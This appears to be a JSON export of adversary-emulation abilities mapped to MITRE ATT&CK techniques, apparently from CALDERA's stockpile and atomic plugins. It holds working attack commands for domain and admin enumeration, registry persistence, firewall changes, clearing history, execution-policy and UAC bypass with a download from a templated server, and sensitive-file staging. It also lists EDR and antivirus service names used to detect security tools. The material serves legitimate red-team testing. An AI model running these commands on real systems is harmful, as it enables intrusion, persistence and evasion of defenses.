[
    {
        "ability_id": "36eecb80-ede3-442b-8774-956e906aff02",
        "buckets": [
            "defense-evasion"
        ],
        "privilege": "",
        "technique_name": "Virtualization/Sandbox Evasion: Time Based Evasion",
        "technique_id": "T1497.003",
        "executors": [
            {
                "timeout": 60,
                "cleanup": [],
                "build_target": null,
                "code": null,
                "platform": "darwin",
                "language": null,
                "additional_info": {},
                "variations": [],
                "command": "sleep 60",
                "name": "sh",
                "parsers": [],
                "payloads": [],
                "uploads": []
            },
            {
                "timeout": 60,
                "cleanup": [],
                "build_target": null,
                "code": null,
                "platform": "linux",
                "language": null,
                "additional_info": {},
                "variations": [],
                "command": "sleep 60",
                "name": "sh",
                "parsers": [],
                "payloads": [],
                "uploads": []
            },
            {
                "timeout": 60,
                "cleanup": [],
                "build_target": null,
                "code": null,
                "platform": "windows",
                "language": null,
                "additional_info": {},
                "variations": [],
                "command": "sleep 60",
                "name": "psh",
                "parsers": [],
                "payloads": [],
                "uploads": []
            }
        ],
        "additional_info": {},
        "access": {},
        "description": "Pause all operations to avoid making noise",
        "plugin": "stockpile",
        "singleton": false,
        "delete_payload": true,
        "name": "1-min sleep",
        "tactic": "defense-evasion",
        "repeatable": false,
        "requirements": []
    },
    {
        "ability_id": "c7ec57cd-933e-42b6-99a4-e852a9e57a33",
        "buckets": [
            "discovery"
        ],
        "privilege": "",
        "technique_name": "Account Discovery: Domain Account",
        "technique_id": "T1087.002",
        "executors": [
            {
                "timeout": 60,
                "cleanup": [],
                "build_target": null,
                "code": null,
                "platform": "windows",
                "language": null,
                "additional_info": {},
                "variations": [],
                "command": "net user /domain",
                "name": "cmd",
                "parsers": [],
                "payloads": [],
                "uploads": []
            }
        ],
        "additional_info": {},
        "access": {},
        "description": "The net utility is executed via cmd to enumerate domain user accounts.",
        "plugin": "stockpile",
        "singleton": false,
        "delete_payload": true,
        "name": "Account Discovery (all)",
        "tactic": "discovery",
        "repeatable": false,
        "requirements": []
    },
    {
        "ability_id": "364ea817-bbb9-4083-87dd-94b9dba45f6f",
        "buckets": [
            "discovery"
        ],
        "privilege": "",
        "technique_name": "Account Discovery: Domain Account",
        "technique_id": "T1087.002",
        "executors": [
            {
                "timeout": 60,
                "cleanup": [],
                "build_target": null,
                "code": null,
                "platform": "windows",
                "language": null,
                "additional_info": {},
                "variations": [],
                "command": "net user #{domain.user.name} /domain",
                "name": "cmd",
                "parsers": [],
                "payloads": [],
                "uploads": []
            },
            {
                "timeout": 60,
                "cleanup": [],
                "build_target": null,
                "code": null,
                "platform": "windows",
                "language": null,
                "additional_info": {},
                "variations": [],
                "command": "net user #{domain.user.name} /domain",
                "name": "psh",
                "parsers": [],
                "payloads": [],
                "uploads": []
            }
        ],
        "additional_info": {},
        "access": {},
        "description": "The net utility is executed via cmd to enumerate detailed information about a specific user account.",
        "plugin": "stockpile",
        "singleton": false,
        "delete_payload": true,
        "name": "Account Discovery (targeted)",
        "tactic": "discovery",
        "repeatable": false,
        "requirements": []
    },
    {
        "ability_id": "2afae782-6d0a-4fbd-a6b6-d1ce90090eac",
        "buckets": [
            "discovery"
        ],
        "privilege": "",
        "technique_name": "Permission Groups Discovery: Domain Groups",
        "technique_id": "T1069.002",
        "executors": [
            {
                "timeout": 60,
                "cleanup": [],
                "build_target": null,
                "code": null,
                "platform": "windows",
                "language": null,
                "additional_info": {},
                "variations": [],
                "command": "Import-Module .\\powerview.ps1;\n$backup = \"#{backup.admin.ability}\";\n$userName = \"#{domain.user.name}\";\n$userPassword = \"#{domain.user.password}\";\n$secStringPassword = ConvertTo-SecureString $userPassword -AsPlainText -Force;\n$credObject = New-Object System.Management.Automation.PSCredential ($userName, $secStringPassword);\nGet-NetLocalGroupMember -ComputerName #{remote.host.fqdn} -Credential $credObject",
                "name": "psh",
                "parsers": [
                    {
                        "module": "plugins.stockpile.app.parsers.netlocalgroup",
                        "parserconfigs": [
                            {
                                "edge": "has_admin",
                                "target": "domain.user.name",
                                "source": "remote.host.fqdn",
                                "custom_parser_vals": {}
                            }
                        ]
                    }
                ],
                "payloads": [
                    "powerview.ps1"
                ],
                "uploads": []
            }
        ],
        "additional_info": {},
        "access": {},
        "description": "Use PowerView to query the Active Directory server to determine remote admins",
        "plugin": "stockpile",
        "singleton": true,
        "delete_payload": true,
        "name": "Account-type Admin Enumerator",
        "tactic": "discovery",
        "repeatable": false,
        "requirements": [
            {
                "module": "plugins.stockpile.app.requirements.not_exists",
                "relationship_match": [
                    {
                        "source": "remote.host.fqdn",
                        "edge": "has_admin"
                    }
                ]
            },
            {
                "module": "plugins.stockpile.app.requirements.basic",
                "relationship_match": [
                    {
                        "source": "backup.admin.ability",
                        "edge": "first_failed"
                    }
                ]
            },
            {
                "module": "plugins.stockpile.app.requirements.basic",
                "relationship_match": [
                    {
                        "source": "domain.user.name",
                        "edge": "has_password",
                        "target": "domain.user.password"
                    }
                ]
            },
            {
                "module": "plugins.stockpile.app.requirements.reachable",
                "relationship_match": [
                    {
                        "source": "remote.host.fqdn",
                        "edge": "isAccessibleFrom"
                    }
                ]
            }
        ]
    },
    {
        "ability_id": "ed3b15750348bb19147cc63c9fcb46db",
        "buckets": [
            "defense-evasion"
        ],
        "privilege": "",
        "technique_name": "Indicator Removal on Host: Network Share Connection Removal",
        "technique_id": "T1070.005",
        "executors": [
            {
                "timeout": 60,
                "cleanup": [],
                "build_target": null,
                "code": null,
                "platform": "windows",
                "language": null,
                "additional_info": {},
                "variations": [],
                "command": "net use c: \\\\test\\share && net share test=\\\\test\\share /REMARK:\"test share\" /CACHE:No",
                "name": "cmd",
                "parsers": [],
                "payloads": [],
                "uploads": []
            }
        ],
        "additional_info": {},
        "access": {},
        "description": "Add a Network Share utilizing the command_prompt\n",
        "plugin": "atomic",
        "singleton": false,
        "delete_payload": true,
        "name": "Add Network Share",
        "tactic": "defense-evasion",
        "repeatable": false,
        "requirements": []
    },
    {
        "ability_id": "4593d72a5145e3f494421ac772d37464",
        "buckets": [
            "multiple"
        ],
        "privilege": "",
        "technique_name": "Boot or Logon Autostart Execution: Port Monitors",
        "technique_id": "T1547.010",
        "executors": [
            {
                "timeout": 60,
                "cleanup": [
                    "reg delete \"hklm\\system\\currentcontrolset\\control\\print\\monitors\\ART\" /f >nul 2>&1"
                ],
                "build_target": null,
                "code": null,
                "platform": "windows",
                "language": null,
                "additional_info": {},
                "variations": [],
                "command": "reg add \"hklm\\system\\currentcontrolset\\control\\print\\monitors\\ART\" /v \"Atomic Red Team\" /d \"C:\\Path\\AtomicRedTeam.dll\" /t REG_SZ",
                "name": "cmd",
                "parsers": [],
                "payloads": [],
                "uploads": []
            }
        ],
        "additional_info": {},
        "access": {},
        "description": "Add key-value pair to a Windows Port Monitor registry. On the subsequent reboot dll will be execute under spoolsv with NT AUTHORITY/SYSTEM privilege.",
        "plugin": "atomic",
        "singleton": false,
        "delete_payload": true,
        "name": "Add Port Monitor persistence in Registry",
        "tactic": "multiple",
        "repeatable": false,
        "requirements": []
    },
    {
        "ability_id": "3939013428dfc0bc10825755685849c2",
        "buckets": [
            "defense-evasion"
        ],
        "privilege": "",
        "technique_name": "Impair Defenses: Disable or Modify System Firewall",
        "technique_id": "T1562.004",
        "executors": [
            {
                "timeout": 60,
                "cleanup": [
                    "{ echo y; echo response; } | ufw delete 1; ufw status numbered"
                ],
                "build_target": null,
                "code": null,
                "platform": "linux",
                "language": null,
                "additional_info": {},
                "variations": [],
                "command": "ufw prepend deny from 1.2.3.4; ufw status numbered",
                "name": "sh",
                "parsers": [],
                "payloads": [],
                "uploads": []
            }
        ],
        "additional_info": {},
        "access": {},
        "description": "Add and delete a rule on the Uncomplicated Firewall (UFW) if installed and enabled. \n",
        "plugin": "atomic",
        "singleton": false,
        "delete_payload": true,
        "name": "Add and delete UFW firewall rules",
        "tactic": "defense-evasion",
        "repeatable": false,
        "requirements": []
    },
    {
        "ability_id": "de52784d-4de6-4d4e-b79e-e7b68fe037fb",
        "buckets": [
            "execution"
        ],
        "privilege": "",
        "technique_name": "Command and Scripting Interpreter: AppleScript",
        "technique_id": "T1059.002",
        "executors": [
            {
                "timeout": 60,
                "cleanup": [],
                "build_target": null,
                "code": null,
                "platform": "darwin",
                "language": null,
                "additional_info": {},
                "variations": [],
                "command": "osascript bookmark.scpt #{host.chrome.bookmark_title[filters(max=1)]} #{server.malicious.url[filters(max=1)]}",
                "name": "sh",
                "parsers": [],
                "payloads": [
                    "bookmark.scpt"
                ],
                "uploads": []
            }
        ],
        "additional_info": {},
        "access": {},
        "description": "Add a malicous bookmark which looks like a current one",
        "plugin": "stockpile",
        "singleton": false,
        "delete_payload": true,
        "name": "Add bookmark",
        "tactic": "execution",
        "repeatable": false,
        "requirements": []
    },
    {
        "ability_id": "10fad81e-3f68-47be-83b6-fbee7711c6a9",
        "buckets": [
            "collection"
        ],
        "privilege": "",
        "technique_name": "Automated Collection",
        "technique_id": "T1119",
        "executors": [
            {
                "timeout": 300,
                "cleanup": [
                    "if (Test-Path -Path '.\\file_search.ps1) {Remove-Item -Force -Path 'file_search.ps1'}"
                ],
                "build_target": null,
                "code": null,
                "platform": "windows",
                "language": null,
                "additional_info": {},
                "variations": [],
                "command": ".\\file_search.ps1 -Extensions '#{windows.included.extensions}' -ExcludedExtensions '#{windows.excluded.extensions}'\n -Directories '#{windows.included.directories}' -ExcludedDirectories '#{windows.excluded.directories}'\n -AccessedCutoff #{file.last.accessed} -ModifiedCutoff #{file.last.modified}\n -SearchStrings '#{file.sensitive.content}' -StagingDirectory '#{windows.staging.location}'\n -SafeMode $#{safe.mode.enabled} -PseudoExtension #{pseudo.data.identifier}",
                "name": "psh",
                "parsers": [
                    {
                        "module": "plugins.stockpile.app.parsers.basic",
                        "parserconfigs": [
                            {
                                "edge": "",
                                "target": "",
                                "source": "host.dir.staged",
                                "custom_parser_vals": {}
                            }
                        ]
                    }
                ],
                "payloads": [
                    "file_search.ps1"
                ],
                "uploads": []
            },
            {
                "timeout": 300,
                "cleanup": [
                    "if [-f ./file_search.sh ]; then rm -f ./file_search.sh; fi"
                ],
                "build_target": null,
                "code": null,
                "platform": "linux",
                "language": null,
                "additional_info": {},
                "variations": [],
                "command": "chmod +x ./file_search.sh; ./file_search.sh --extensions '#{linux.included.extensions}'\n --directories '#{linux.included.directories}' --exclude-dir '#{linux.excluded.directories}'\n --accessed '#{file.last.accessed}' --modified '#{file.last.modified}' --search-strings '#{file.sensitive.content}'\n --staging-directory '#{linux.staging.location}' --safe-mode '#{safe.mode.enabled}' --pseudo-ext '#{pseudo.data.identifier}'",
                "name": "sh",
                "parsers": [
                    {
                        "module": "plugins.stockpile.app.parsers.basic",
                        "parserconfigs": [
                            {
                                "edge": "",
                                "target": "",
                                "source": "host.dir.staged",
                                "custom_parser_vals": {}
                            }
                        ]
                    }
                ],
                "payloads": [
                    "file_search.sh"
                ],
                "uploads": []
            }
        ],
        "additional_info": {},
        "access": {},
        "description": "Highly configurable file finder and stager for Linux and Windows. Drops a payload file to the host to parse\narguments rather than running multiple commands for each fact (e.g., each file type). This ability allows for a safe\nmode, only staging files found that have the appropriate file ending. The staging directory is configurable but\ndefaults to the current user's Recycle Bin (Windows) and /tmp (Linux). Payload files include default values for all\nparameters (matching the base fact source - File Search and Stage). Options for searches: file extensions (include,\nexclude [windows]), directories (include, exclude), accessed date cutoff, modified date cutoff, sensitive search\nstrings in files or titles.\n",
        "plugin": "stockpile",
        "singleton": false,
        "delete_payload": true,
        "name": "Advanced File Search and Stager",
        "tactic": "collection",
        "repeatable": false,
        "requirements": []
    },
    {
        "ability_id": "41627f71f968225b9f162cb76d16bd9d",
        "buckets": [
            "defense-evasion"
        ],
        "privilege": "",
        "technique_name": "Impair Defenses: Disable or Modify System Firewall",
        "technique_id": "T1562.004",
        "executors": [
            {
                "timeout": 60,
                "cleanup": [
                    "netsh advfirewall firewall delete rule name=\"Atomic Test\" | Out-Null; Remove-Item C:\\Users\\$env:UserName\\AtomicTest.exe -ErrorAction Ignore"
                ],
                "build_target": null,
                "code": null,
                "platform": "windows",
                "language": null,
                "additional_info": {},
                "variations": [],
                "command": "Copy-Item f7ce09_AtomicTest.exe -Destination \"C:\\Users\\$env:UserName\" -Force; netsh advfirewall firewall add rule name=\"Atomic Test\" dir=in action=allow program=\"C:\\Users\\$env:UserName\\AtomicTest.exe\" enable=yes",
                "name": "psh",
                "parsers": [
                    {
                        "module": "plugins.atomic.app.parsers.atomic_powershell",
                        "parserconfigs": [
                            {
                                "edge": "",
                                "target": "",
                                "source": "validate_me",
                                "custom_parser_vals": {}
                            }
                        ]
                    }
                ],
                "payloads": [
                    "f7ce09_AtomicTest.exe"
                ],
                "uploads": []
            }
        ],
        "additional_info": {},
        "access": {},
        "description": "This test will attempt to allow an executable through the system firewall located in the Users directory",
        "plugin": "atomic",
        "singleton": false,
        "delete_payload": true,
        "name": "Allow Executable Through Firewall Located in Non-Standard Location",
        "tactic": "defense-evasion",
        "repeatable": false,
        "requirements": []
    },
    {
        "ability_id": "280003641a5cddf916c4f2bf605a71d3",
        "buckets": [
            "defense-evasion"
        ],
        "privilege": "",
        "technique_name": "Impair Defenses: Disable or Modify System Firewall",
        "technique_id": "T1562.004",
        "executors": [
            {
                "timeout": 60,
                "cleanup": [
                    "netsh advfirewall reset >nul 2>&1"
                ],
                "build_target": null,
                "code": null,
                "platform": "windows",
                "language": null,
                "additional_info": {},
                "variations": [],
                "command": "netsh advfirewall firewall set rule group=\"remote desktop\" new enable=Yes && netsh advfirewall firewall set rule group=\"file and printer sharing\" new enable=Yes",
                "name": "cmd",
                "parsers": [],
                "payloads": [],
                "uploads": []
            }
        ],
        "additional_info": {},
        "access": {},
        "description": "Allow all SMB and RDP rules on the Microsoft Defender Firewall for all profiles.\nCaution if you access remotely the host where the test runs! Especially with the cleanup command which will reset the firewall and risk disabling those services...\n",
        "plugin": "atomic",
        "singleton": false,
        "delete_payload": true,
        "name": "Allow SMB and RDP on Microsoft Defender Firewall",
        "tactic": "defense-evasion",
        "repeatable": false,
        "requirements": []
    },
    {
        "ability_id": "5c65eec8-4839-4713-a4e1-86b2e75d1927",
        "buckets": [
            "discovery"
        ],
        "privilege": "",
        "technique_name": "Application Window Discovery",
        "technique_id": "T1010",
        "executors": [
            {
                "timeout": 60,
                "cleanup": [],
                "build_target": null,
                "code": null,
                "platform": "windows",
                "language": null,
                "additional_info": {},
                "variations": [],
                "command": "$x = Get-Process | Where-Object {$_.MainWindowTitle -ne \"\"} | Select-Object MainWindowTitle;\n$a = New-Object -com \"Shell.Application\"; $b = $a.windows() | select-object LocationName;\nwrite-host ($x | Format-List | Out-String) ($b | Format-List | Out-String)",
                "name": "psh",
                "parsers": [],
                "payloads": [],
                "uploads": []
            }
        ],
        "additional_info": {},
        "access": {},
        "description": "Extracts the names of all open non-explorer windows, and the locations of all explorer windows.",
        "plugin": "stockpile",
        "singleton": false,
        "delete_payload": true,
        "name": "Application Window Discovery",
        "tactic": "discovery",
        "repeatable": false,
        "requirements": []
    },
    {
        "ability_id": "c11da2b048a9b0148f303ce5727f8fc0",
        "buckets": [
            "multiple"
        ],
        "privilege": "",
        "technique_name": "Scheduled Task/Job: At (Linux)",
        "technique_id": "T1053.001",
        "executors": [
            {
                "timeout": 60,
                "cleanup": [],
                "build_target": null,
                "code": null,
                "platform": "linux",
                "language": null,
                "additional_info": {},
                "variations": [],
                "command": "echo \"echo Hello from Atomic Red Team\" | at now + 1 minute",
                "name": "sh",
                "parsers": [],
                "payloads": [],
                "uploads": []
            }
        ],
        "additional_info": {},
        "access": {},
        "description": "This test submits a command to be run in the future by the `at` daemon.\n",
        "plugin": "atomic",
        "singleton": false,
        "delete_payload": true,
        "name": "At - Schedule a job",
        "tactic": "multiple",
        "repeatable": false,
        "requirements": []
    },
    {
        "ability_id": "1b82e5d4e4707c4923e7a0f8143b3186",
        "buckets": [
            "multiple"
        ],
        "privilege": "",
        "technique_name": "Scheduled Task/Job: At (Windows)",
        "technique_id": "T1053.002",
        "executors": [
            {
                "timeout": 60,
                "cleanup": [],
                "build_target": null,
                "code": null,
                "platform": "windows",
                "language": null,
                "additional_info": {},
                "variations": [],
                "command": "at 13:20 /interactive cmd",
                "name": "cmd",
                "parsers": [],
                "payloads": [],
                "uploads": []
            }
        ],
        "additional_info": {},
        "access": {},
        "description": "Executes cmd.exe\nNote: deprecated in Windows 8+\n\nUpon successful execution, cmd.exe will spawn at.exe and create a scheduled task that will spawn cmd at a specific time.\n",
        "plugin": "atomic",
        "singleton": false,
        "delete_payload": true,
        "name": "At.exe Scheduled task",
        "tactic": "multiple",
        "repeatable": false,
        "requirements": []
    },
    {
        "ability_id": "43b3754c-def4-4699-a673-1d85648fda6a",
        "buckets": [
            "defense-evasion"
        ],
        "privilege": "",
        "technique_name": "Indicator Removal on Host: Clear Command History",
        "technique_id": "T1070.003",
        "executors": [
            {
                "timeout": 60,
                "cleanup": [],
                "build_target": null,
                "code": null,
                "platform": "darwin",
                "language": null,
                "additional_info": {},
                "variations": [],
                "command": "> $HOME/.bash_history && unset HISTFILE",
                "name": "sh",
                "parsers": [],
                "payloads": [],
                "uploads": []
            },
            {
                "timeout": 60,
                "cleanup": [],
                "build_target": null,
                "code": null,
                "platform": "linux",
                "language": null,
                "additional_info": {},
                "variations": [],
                "command": "> $HOME/.bash_history && unset HISTFILE",
                "name": "sh",
                "parsers": [],
                "payloads": [],
                "uploads": []
            },
            {
                "timeout": 60,
                "cleanup": [],
                "build_target": null,
                "code": null,
                "platform": "windows",
                "language": null,
                "additional_info": {},
                "variations": [],
                "command": "Clear-History;Clear",
                "name": "psh",
                "parsers": [],
                "payloads": [],
                "uploads": []
            }
        ],
        "additional_info": {},
        "access": {},
        "description": "Stop terminal from logging history",
        "plugin": "stockpile",
        "singleton": false,
        "delete_payload": true,
        "name": "Avoid logs",
        "tactic": "defense-evasion",
        "repeatable": false,
        "requirements": []
    },
    {
        "ability_id": "3864fd22-5c63-41c9-bdbc-a66b5ffa3f5e",
        "buckets": [
            "defense-evasion"
        ],
        "privilege": "",
        "technique_name": "Impair Defenses: Disable or Modify Tools",
        "technique_id": "T1562.001",
        "executors": [
            {
                "timeout": 60,
                "cleanup": [],
                "build_target": null,
                "code": null,
                "platform": "windows",
                "language": null,
                "additional_info": {},
                "variations": [],
                "command": "Set-ItemProperty -Path HKLM:\\Software\\Policies\\Microsoft\\Windows\\PowerShell -Name ExecutionPolicy -Value ByPass;\n        $shell = New-Object -ComObject Wscript.Shell\n        Set-ExecutionPolicy Bypass | echo $shell.sendkeys(\"Y`r`n\")",
                "name": "psh",
                "parsers": [],
                "payloads": [],
                "uploads": []
            }
        ],
        "additional_info": {},
        "access": {},
        "description": "Ensure the ExecutionPolicy is turned to Bypass",
        "plugin": "stockpile",
        "singleton": false,
        "delete_payload": true,
        "name": "Bypass ExecutionPolicy",
        "tactic": "defense-evasion",
        "repeatable": false,
        "requirements": []
    },
    {
        "ability_id": "e3db134c-4aed-4c5a-9607-c50183c9ef9e",
        "buckets": [
            "privilege-escalation"
        ],
        "privilege": "",
        "technique_name": "Abuse Elevation Control Mechanism: Bypass User Access Control",
        "technique_id": "T1548.002",
        "executors": [
            {
                "timeout": 60,
                "cleanup": [],
                "build_target": null,
                "code": null,
                "platform": "windows",
                "language": null,
                "additional_info": {},
                "variations": [],
                "command": "$url=\"#{server}/file/download\"; $wc=New-Object System.Net.WebClient; $wc.Headers.add(\"platform\",\"windows\"); $wc.Headers.add(\"file\",\"sandcat.go\"); $data=$wc.DownloadData($url); $name=$wc.ResponseHeaders[\"Content-Disposition\"].Substring($wc.ResponseHeaders[\"Content-Disposition\"].IndexOf(\"filename=\")+9).Replace(\"`\"\",\"\"); [io.file]::WriteAllBytes(\"C:\\Users\\Public\\$name.exe\",$data);\n$job = Start-Job -ScriptBlock { Import-Module -Name .\\Bypass-UAC.ps1; Bypass-UAC -Command \"C:\\Users\\Public\\$name.exe -group #{group}\"; };\nReceive-Job -Job $job -Wait;",
                "name": "psh",
                "parsers": [],
                "payloads": [
                    "Bypass-UAC.ps1"
                ],
                "uploads": []
            }
        ],
        "additional_info": {},
        "access": {},
        "description": "Bypass user account controls - medium",
        "plugin": "stockpile",
        "singleton": false,
        "delete_payload": true,
        "name": "Bypass UAC Medium",
        "tactic": "privilege-escalation",
        "repeatable": false,
        "requirements": []
    },
    {
        "ability_id": "830bb6ed-9594-4817-b1a1-c298c0f9f425",
        "buckets": [
            "discovery"
        ],
        "privilege": "",
        "technique_name": "Software Discovery",
        "technique_id": "T1518",
        "executors": [
            {
                "timeout": 60,
                "cleanup": [],
                "build_target": null,
                "code": null,
                "platform": "darwin",
                "language": null,
                "additional_info": {},
                "variations": [],
                "command": "google-chrome --version",
                "name": "sh",
                "parsers": [],
                "payloads": [],
                "uploads": []
            },
            {
                "timeout": 60,
                "cleanup": [],
                "build_target": null,
                "code": null,
                "platform": "linux",
                "language": null,
                "additional_info": {},
                "variations": [],
                "command": "google-chrome --version",
                "name": "sh",
                "parsers": [],
                "payloads": [],
                "uploads": []
            }
        ],
        "additional_info": {},
        "access": {},
        "description": "Check to see if Gooogle Chrome browser is installed",
        "plugin": "stockpile",
        "singleton": false,
        "delete_payload": true,
        "name": "Check Chrome",
        "tactic": "discovery",
        "repeatable": false,
        "requirements": []
    },
    {
        "ability_id": "9849d956-37ea-49f2-a8b5-f2ca080b315d",
        "buckets": [
            "discovery"
        ],
        "privilege": "",
        "technique_name": "Software Discovery",
        "technique_id": "T1518",
        "executors": [
            {
                "timeout": 60,
                "cleanup": [],
                "build_target": null,
                "code": null,
                "platform": "darwin",
                "language": null,
                "additional_info": {},
                "variations": [],
                "command": "go version",
                "name": "sh",
                "parsers": [],
                "payloads": [],
                "uploads": []
            },
            {
                "timeout": 60,
                "cleanup": [],
                "build_target": null,
                "code": null,
                "platform": "linux",
                "language": null,
                "additional_info": {},
                "variations": [],
                "command": "go version",
                "name": "sh",
                "parsers": [],
                "payloads": [],
                "uploads": []
            }
        ],
        "additional_info": {},
        "access": {},
        "description": "Check to see if GoLang is installed",
        "plugin": "stockpile",
        "singleton": false,
        "delete_payload": true,
        "name": "Check Go",
        "tactic": "discovery",
        "repeatable": false,
        "requirements": []
    },
    {
        "ability_id": "b18e8767-b7ea-41a3-8e80-baf65a5ddef5",
        "buckets": [
            "discovery"
        ],
        "privilege": "",
        "technique_name": "Software Discovery",
        "technique_id": "T1518",
        "executors": [
            {
                "timeout": 60,
                "cleanup": [],
                "build_target": null,
                "code": null,
                "platform": "darwin",
                "language": null,
                "additional_info": {},
                "variations": [],
                "command": "python3 --version;python2 --version;python --version",
                "name": "sh",
                "parsers": [],
                "payloads": [],
                "uploads": []
            },
            {
                "timeout": 60,
                "cleanup": [],
                "build_target": null,
                "code": null,
                "platform": "linux",
                "language": null,
                "additional_info": {},
                "variations": [],
                "command": "python3 --version;python2 --version;python --version",
                "name": "sh",
                "parsers": [],
                "payloads": [],
                "uploads": []
            },
            {
                "timeout": 60,
                "cleanup": [],
                "build_target": null,
                "code": null,
                "platform": "windows",
                "language": null,
                "additional_info": {},
                "variations": [],
                "command": "python3 --version&python2 --version&python --version",
                "name": "cmd",
                "parsers": [],
                "payloads": [],
                "uploads": []
            }
        ],
        "additional_info": {},
        "access": {},
        "description": "Check to see what version of python is installed",
        "plugin": "stockpile",
        "singleton": false,
        "delete_payload": true,
        "name": "Check Python",
        "tactic": "discovery",
        "repeatable": false,
        "requirements": []
    },
    {
        "ability_id": "1258b063-27d6-489b-a677-4807faacf868",
        "buckets": [
            "defense-evasion"
        ],
        "privilege": "",
        "technique_name": "Virtualization/Sandbox Evasion: System Checks",
        "technique_id": "T1497.001",
        "executors": [
            {
                "timeout": 60,
                "cleanup": [],
                "build_target": null,
                "code": null,
                "platform": "windows",
                "language": null,
                "additional_info": {},
                "variations": [],
                "command": "$securityServices = @(\n    \"msmpeng\",\n    \"windefend\",\n    \"mssense\",\n    \"sense\",\n    \"microsoft.tri.sensor\",\n    \"microsoft.tri.sensor.updater\",\n    \"cavp\",\n    \"cb\",\n    \"carbonblack\",\n    \"carbonblackk\",\n    \"cbcomms\",\n    \"cbstream\",\n    \"csfalconservice\",\n    \"csfalconcontainer\",\n    \"csagent\",\n    \"csdevicecontrol\",\n    \"csfalconservice\",\n    \"xagt\",\n    \"xagtnotif\",\n    \"fe_avk\",\n    \"fekern\",\n    \"feelam\",\n    \"fewscservice\",\n    \"ekrn\",\n    \"eguiproxy\",\n    \"egui\",\n    \"eamonm\",\n    \"eelam\",\n    \"ehdrv\",\n    \"ekrnepfw\",\n    \"epfwwfp\",\n    \"ekbdflt\",\n    \"epfw\",\n    \"fsgk32st\",\n    \"fswebuid\",\n    \"fsgk32\",\n    \"fsma32\",\n    \"fssm32\",\n    \"fnrb32\",\n    \"fsaua\",\n    \"fsorsp\",\n    \"fsav32\",\n    \"f-secure gatekeeper handler starter\",\n    \"f-secure network request broker\",\n    \"f-secure webui daemon\",\n    \"fsma\",\n    \"fsorspclient\",\n    \"f-secure gatekeeper\",\n    \"f-secure hips\",\n    \"fsbts\",\n    \"fsni\",\n    \"fsvista\",\n    \"f-secure filter\",\n    \"f-secure recognizer\",\n    \"fses\",\n    \"fsfw\",\n    \"fsdfw\",\n    \"fsms\",\n    \"fsdevcon\"\n);\n\n$currentServices = Get-Service | Select-Object -Property Name;\nforeach ($svc in $currentServices) {\n    foreach ($secSvc in $securityServices) {\n        if ($svc.Name -like $secSvc) {\n            $svcDetails = Get-Service -name $svc.Name | Select-Object -Property Name, DisplayName, Status;\n            Write-Host \"[!] Security service found:\";\n            Write-Host \"    Service Name:`t\", $svcDetails.Name;\n            Write-Host \"    Display Name:`t\", $svcDetails.DisplayName;\n            Write-Host \"    Status:`t`t\", $svcDetails.Status;\n            Write-Host \"\";\n        }\n    }\n}",
                "name": "psh",
                "parsers": [],
                "payloads": [],
                "uploads": []
            },
            {
                "timeout": 60,
                "cleanup": [],
                "build_target": null,
                "code": null,
                "platform": "windows",
                "language": null,
                "additional_info": {},
                "variations": [],
                "command": "$securityServices = @(\n    \"msmpeng\",\n    \"windefend\",\n    \"mssense\",\n    \"sense\",\n    \"microsoft.tri.sensor\",\n    \"microsoft.tri.sensor.updater\",\n    \"cavp\",\n    \"cb\",\n    \"carbonblack\",\n    \"carbonblackk\",\n    \"cbcomms\",\n    \"cbstream\",\n    \"csfalconservice\",\n    \"csfalconcontainer\",\n    \"csagent\",\n    \"csdevicecontrol\",\n    \"csfalconservice\",\n    \"xagt\",\n    \"xagtnotif\",\n    \"fe_avk\",\n    \"fekern\",\n    \"feelam\",\n    \"fewscservice\",\n    \"ekrn\",\n    \"eguiproxy\",\n    \"egui\",\n    \"eamonm\",\n    \"eelam\",\n    \"ehdrv\",\n    \"ekrnepfw\",\n    \"epfwwfp\",\n    \"ekbdflt\",\n    \"epfw\",\n    \"fsgk32st\",\n    \"fswebuid\",\n    \"fsgk32\",\n    \"fsma32\",\n    \"fssm32\",\n    \"fnrb32\",\n    \"fsaua\",\n    \"fsorsp\",\n    \"fsav32\",\n    \"f-secure gatekeeper handler starter\",\n    \"f-secure network request broker\",\n    \"f-secure webui daemon\",\n    \"fsma\",\n    \"fsorspclient\",\n    \"f-secure gatekeeper\",\n    \"f-secure hips\",\n    \"fsbts\",\n    \"fsni\",\n    \"fsvista\",\n    \"f-secure filter\",\n    \"f-secure recognizer\",\n    \"fses\",\n    \"fsfw\",\n    \"fsdfw\",\n    \"fsms\",\n    \"fsdevcon\"\n);\n\n$currentServices = Get-Service | Select-Object -Property Name;\nforeach ($svc in $currentServices) {\n    foreach ($secSvc in $securityServices) {\n        if ($svc.Name -like $secSvc) {\n            $svcDetails = Get-Service -name $svc.Name | Select-Object -Property Name, DisplayName, Status;\n            Write-Host \"[!] Security service found:\";\n            Write-Host \"    Service Name:`t\", $svcDetails.Name;\n            Write-Host \"    Display Name:`t\", $svcDetails.DisplayName;\n            Write-Host \"    Status:`t`t\", $svcDetails.Status;\n            Write-Host \"\";\n        }\n    }\n}",
                "name": "pwsh",
                "parsers": [],
                "payloads": [],
                "uploads": []
            }
        ],
        "additional_info": {},
        "access": {},
        "description": "Check for security services. Security service list is based on the SUNBURST malware observed in a Solarwinds related compromise (https://research.checkpoint.com/2020/sunburst-teardrop-and-the-netsec-new-normal/).",
        "plugin": "stockpile",
        "singleton": false,
        "delete_payload": true,
        "name": "Check Security Services",
        "tactic": "defense-evasion",
        "repeatable": false,
        "requirements": []
    },
    {
        "ability_id": "7a6ba833-de40-466a-8969-5c37b13603e0",
        "buckets": [
            "defense-evasion"
        ],
        "privilege": "",
        "technique_name": "Virtualization/Sandbox Evasion: System Checks",
        "technique_id": "T1497.001",
        "executors": [
            {
                "timeout": 60,
                "cleanup": [],
                "build_target": null,
                "code": null,
                "platform": "windows",
                "language": null,
                "additional_info": {},
                "variations": [],
